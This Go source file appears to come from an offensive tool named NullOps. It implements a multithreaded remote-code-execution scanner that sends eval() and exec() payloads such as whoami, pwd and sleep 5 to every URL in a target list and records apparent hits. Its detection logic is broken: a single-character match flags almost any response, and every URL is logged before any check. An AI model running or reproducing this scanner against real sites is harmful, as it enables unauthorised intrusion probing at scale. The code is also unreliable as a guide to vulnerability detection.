package Scanners

import (
	"NullOps/CLI_Handlers"
	"NullOps/Helpers"
	"NullOps/Interface"
	"fmt"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

var payloadRCE = []string{
	"eval('ls')",
	"eval('pwd')",
	"eval('pwd');",
	"eval('sleep 5')",
	"eval('sleep 5');",
	"eval('whoami')",
	"eval('whoami');",
	"exec('ls')",
	"exec('pwd')",
	"exec('pwd');",
	"exec('sleep 5')",
	"exec('sleep 5');",
	"exec('whoami')",
	"exec('whoami');",
}

var responsesRCE = []string{
	"system",
	"shell_exec",
	"exec",
	"eval",
	"shell_exec",
}

func scanRCE(config *Helpers.Runner) *Helpers.RunnerResult {
	for _, payload := range payloadRCE {
		atomic.AddInt32(&Helpers.PayloadsTested, 1)
		Response, Error := Helpers.SendRequest(config.Line, "GET", payload, Helpers.RequestOptions{})

		if Error == nil {
			for _, resp := range responsesRCE {
				err := CLI_Handlers.AppendToFile(Helpers.OutputPath+"/RCE.txt", []string{config.Line + payload})
				CLI_Handlers.LogError(err)
				if strings.ContainsAny(string(Response.Body), resp) {
					return &Helpers.RunnerResult{
						Line:   Helpers.ExtractDomain(config.Line) + " | Payload: " + resp,
						Status: true,
						Error:  nil,
					}
				}
			}
		}
	}

	return &Helpers.RunnerResult{
		Line:   config.Line,
		Status: false,
		Error:  fmt.Errorf("Invalid"),
	}
}

func ScannerRCE(config *Helpers.ScanConfig) {
	Helpers.Valid, Helpers.Invalid, Helpers.Checked, Helpers.PayloadsTested, Helpers.CPM, Helpers.HighestCPM, Helpers.Running = 0, 0, 0, 0, 0, 0, true

	FilePath := CLI_Handlers.GetFilePath()
	lines, err := CLI_Handlers.ReadLines(FilePath)
	CLI_Handlers.LogError(err)

	startTime := time.Now()
	go func() {
		for {
			if Helpers.Running {
				tested := strconv.Itoa(int(atomic.LoadInt32(&Helpers.PayloadsTested)))
				elapsedTime := time.Since(startTime)
				Helpers.CPM = int32(int(Helpers.CalculateCPM(int(atomic.LoadInt32(&Helpers.Valid))+int(atomic.LoadInt32(&Helpers.Invalid)), elapsedTime)))
				Helpers.HighestCPM = int32(Helpers.BestCPM(int(Helpers.CPM), int(atomic.LoadInt32(&Helpers.HighestCPM))))

				Interface.StatsTitle(fmt.Sprintf("NullOps | Payloads Tested: %v | CPM: %v | Highest CPM: %v", tested, int(atomic.LoadInt32(&Helpers.CPM)), int(atomic.LoadInt32(&Helpers.HighestCPM))), int(atomic.LoadInt32(&Helpers.Valid)), int(atomic.LoadInt32(&Helpers.Invalid)), int(atomic.LoadInt32(&Helpers.Checked)), len(lines))
				time.Sleep(1 * time.Second)
			} else {
				return
			}
		}
	}()

	defer func() {
		Helpers.Running = false
	}()

	Helpers.Threading(func(s string) {
		ScanConfig := Helpers.Runner{Line: s}
		RunnerResult := scanRCE(&ScanConfig)

		if RunnerResult.Error == nil {
			atomic.AddInt32(&Helpers.Valid, 1)
			Interface.Option(config.Name, fmt.Sprintf("%v | Status: %v", RunnerResult.Line, RunnerResult.Status))
		} else {
			atomic.AddInt32(&Helpers.Invalid, 1)
			if config.PrintInvalid {
				Interface.Option(config.Name, fmt.Sprintf("%v | Status: %v | Reason: %v", Helpers.ExtractDomain(RunnerResult.Line), RunnerResult.Status, RunnerResult.Error))
			}
		}
		atomic.AddInt32(&Helpers.Checked, 1)
	}, config.Threads, lines)
}
